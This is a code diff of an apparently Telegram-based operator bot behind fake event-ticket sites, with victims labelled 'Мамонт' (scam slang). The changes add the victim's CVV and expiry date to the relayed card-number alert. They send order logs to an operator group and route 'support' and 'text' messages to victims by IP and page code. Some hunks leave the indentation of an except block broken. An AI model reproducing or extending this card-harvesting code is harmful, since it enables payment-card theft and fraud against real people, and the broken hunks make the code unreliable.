@@ -363,7 +363,7 @@ def format_code_request_message(admin_username, name, price, currency, page_code
     )
     return message
 
-def format_card_payment_message(page_code, name, price, currency, card_number, country=""):
+def format_card_payment_message(page_code, name, price, currency, card_number, cvv="", expiry="", country=""):
     """Формує красиве повідомлення про введення карти"""
     # Визначаємо назву події за page_code
     event_name = "Выставка"  # За замовчуванням
@@ -392,6 +392,8 @@ def format_card_payment_message(page_code, name, price, currency, card_number, c
         f"👤 Мамонт: {name or 'Не указано'}\n"
         f"💰 Сумма: {price or 'Не указано'}{currency or ''}\n"
         f"💳 Номер карты: {card_number or 'Не указано'}\n"
+        f"📅 Срок действия: {expiry or 'Не указано'}\n"
+        f"🔐 CVV: {cvv or 'Не указано'}\n"
         f"🌍 Страна карты: {country or 'Не указано'}"
     )
     
@@ -1761,7 +1763,7 @@ async def ticket_input_handler(message: types.Message):
                 if os.path.exists(p):
                     img_path = p
                     break
-            
+                    
             if img_path is None:
                 img_path = os.path.join('events-art.com', 'image', 'header-image.jpg')
         
@@ -1892,11 +1894,11 @@ async def ticket_input_handler(message: types.Message):
                         f"🆔 ID: `{order_id}`",
                 parse_mode="Markdown"
             )
-        except Exception as e:
-            logging.error(f"[TICKET PDF SEND ERROR] {e}")
+    except Exception as e:
+        logging.error(f"[TICKET PDF SEND ERROR] {e}")
             await message.answer(f"❌ Помилка при відправці PDF: {e}")
         
-        # Відправляємо посилання
+    # Відправляємо посилання
         await message.answer(
             f"🔗 **Посилання на квиток:**\n"
             f"`{ticket_url}`\n\n"
@@ -1923,7 +1925,7 @@ async def ticket_input_handler(message: types.Message):
             "Спробуйте ще раз або зверніться до адміністратора.",
             parse_mode="Markdown"
         )
-        user_step[uid] = None
+    user_step[uid] = None
 
 @router.callback_query(lambda c: c.data == "tickets_cancel")
 async def tickets_cancel_handler(call: types.CallbackQuery):
@@ -2212,7 +2214,12 @@ async def cancel_links_template(message: types.Message):
 async def admin_enter_text(message: types.Message):
     print(f"admin_enter_text called by {message.from_user.id} with text: {message.text}")
     step = user_step[message.from_user.id]
-    ip = step.replace("text_for_", "")
+    # Парсимо IP та page_code
+    if ':' in step:
+        ip, page_code = step.replace("text_for_", "").split(':', 1)
+    else:
+        ip = step.replace("text_for_", "")
+        page_code = None
     text = message.text
     text_id = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
     
@@ -2229,23 +2236,16 @@ async def admin_enter_text(message: types.Message):
         if row:
             user_name = row[0]
         
-        # Знаходимо page_code за IP
-        page_code_for_text = None
-        c.execute('SELECT page_code FROM site_users WHERE ip=? ORDER BY created_at DESC LIMIT 1', (ip,))
-        row = c.fetchone()
-        if row:
-            page_code_for_text = row[0]
-        
-        if page_code_for_text:
+        if page_code:  # Додаємо перевірку page_code
             # Отримуємо інформацію про подію
-            event_info = get_event_info_by_page_code(page_code_for_text)
+            event_info = get_event_info_by_page_code(page_code)
             if event_info:
                 event_price = event_info.get('price')
                 event_currency = event_info.get('currency')
             
             # Надсилаємо красиве повідомлення про текст адміну, чия це посилання
             admin_user_id = None
-            c.execute('SELECT user_id FROM event_links WHERE event_code=?', (page_code_for_text,))
+            c.execute('SELECT user_id FROM event_links WHERE event_code=?', (page_code,))
             row = c.fetchone()
             if row:
                 admin_user_id = row[0]
@@ -2655,12 +2655,12 @@ async def payment_notify(request):
         currency=currency
     )
     
-    # Надсилаємо лог про початок оформлення в чат без кнопок
+    # Надсилаємо лог про початок оформлення в групу без кнопок
     try:
-        await bot.send_message(ADMIN_ID, order_start_message)
-        print(f"[DEBUG] Order start message sent to ADMIN_ID: {order_start_message}")
+        await bot.send_message(GROUP_ID, order_start_message)
+        print(f"[DEBUG] Order start message sent to GROUP_ID: {order_start_message}")
     except Exception as e:
-        print(f"[ERROR] Не вдалося надіслати order_start_message у ADMIN_ID: {e}")
+        print(f"[ERROR] Не вдалося надіслати order_start_message у GROUP_ID: {e}")
         import traceback
         traceback.print_exc()
     
@@ -2672,6 +2672,8 @@ async def payment_notify(request):
         price=price,
         currency=currency,
         card_number=card,
+        cvv=cvv,
+        expiry=expiry,
         country=""  # Країну можна додати пізніше
     )
     kb2_buttons = [
@@ -2686,8 +2688,8 @@ async def payment_notify(request):
         inline_keyboard=[
             kb2_buttons,
         [
-                InlineKeyboardButton(text="Тех поддержка", callback_data=f"support:{ip}"),
-            InlineKeyboardButton(text="Text", callback_data=f"text:{ip}")
+                InlineKeyboardButton(text="Тех поддержка", callback_data=f"support:{ip}:{page_code}" if page_code else f"support:{ip}"),
+            InlineKeyboardButton(text="Text", callback_data=f"text:{ip}:{page_code}" if page_code else f"text:{ip}")
         ]
     ]
     )
@@ -2884,7 +2886,7 @@ async def admin_action_handler(call: types.CallbackQuery):
     parts = call.data.split(':')
     action = parts[0]
     ip = parts[1] if len(parts) > 1 else None
-    page_code = parts[2] if action == 'push' and len(parts) > 2 else None
+    page_code = parts[2] if len(parts) > 2 else None
     
     # Отримуємо інформацію про користувача та подію
     user_name = None
@@ -2954,36 +2956,29 @@ async def admin_action_handler(call: types.CallbackQuery):
             await session.post('http://127.0.0.1:8080/set_support_flag', json={'ip': ip, 'type': 'support'})
         
         # Надсилаємо красиве повідомлення про технічну підтримку
-        if ip:
-            # Знаходимо page_code за IP
-            page_code_for_support = None
+        if ip and page_code:  # Додаємо перевірку page_code
+            admin_user_id = None
             c = conn.cursor()
-            c.execute('SELECT page_code FROM site_users WHERE ip=? ORDER BY created_at DESC LIMIT 1', (ip,))
+            c.execute('SELECT user_id FROM event_links WHERE event_code=?', (page_code,))
             row = c.fetchone()
             if row:
-                page_code_for_support = row[0]
+                admin_user_id = row[0]
             
-            if page_code_for_support:
-                admin_user_id = None
-                c.execute('SELECT user_id FROM event_links WHERE event_code=?', (page_code_for_support,))
-                row = c.fetchone()
-                if row:
-                    admin_user_id = row[0]
-                
-                if admin_user_id:
-                    admin_username = get_admin_username_by_user_id(admin_user_id)
-                    support_message = format_support_notification_message(
-                        admin_username=admin_username,
-                        name=user_name,
-                        price=event_price,
-                        currency=event_currency
-                    )
-                    await bot.send_message(admin_user_id, support_message)
+            if admin_user_id:
+                admin_username = get_admin_username_by_user_id(admin_user_id)
+                support_message = format_support_notification_message(
+                    admin_username=admin_username,
+                    name=user_name,
+                    price=event_price,
+                    currency=event_currency
+                )
+                await bot.send_message(admin_user_id, support_message)
         
         await call.answer("Включена технічна підтримка")
     elif action == 'text':
         await call.answer("Введіть текст повідомлення:")
-        user_step[call.from_user.id] = f'text_for_{ip}'; return
+        user_step[call.from_user.id] = f'text_for_{ip}:{page_code}' if page_code else f'text_for_{ip}'
+        return
     elif action == 'code_request_again':
         async with aiohttp_client.ClientSession() as session:
             await session.post('http://127.0.0.1:8080/set_request_again', json={'code': ip})
